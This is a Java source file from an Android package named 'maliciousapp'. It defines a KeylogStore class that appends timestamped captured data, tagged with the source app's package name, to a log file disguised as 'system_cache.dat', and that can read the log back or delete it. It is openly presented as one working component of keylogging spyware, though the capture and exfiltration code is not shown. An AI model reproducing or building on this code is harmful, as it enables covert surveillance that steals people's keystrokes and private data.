package com.boltz.maliciousapp;

import android.content.Context;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeylogStore {

    private static final String LOG_FILE = "system_cache.dat";
    private static final SimpleDateFormat SDF =
            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    public static synchronized void write(Context context, String tag, String packageName, String data) {
        try {
            FileOutputStream fos = context.openFileOutput(LOG_FILE, Context.MODE_APPEND);
            String entry = "[" + SDF.format(new Date()) + "] " + tag + " | " + packageName + " | " + data + "\n";
            fos.write(entry.getBytes());
            fos.close();
        } catch (IOException ignored) {
        }
    }

    public static String readAll(Context context) {
        StringBuilder sb = new StringBuilder();
        try {
            FileInputStream fis = context.openFileInput(LOG_FILE);
            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            reader.close();
        } catch (IOException ignored) {
        }
        return sb.toString();
    }

    public static void clear(Context context) {
        context.deleteFile(LOG_FILE);
    }
}
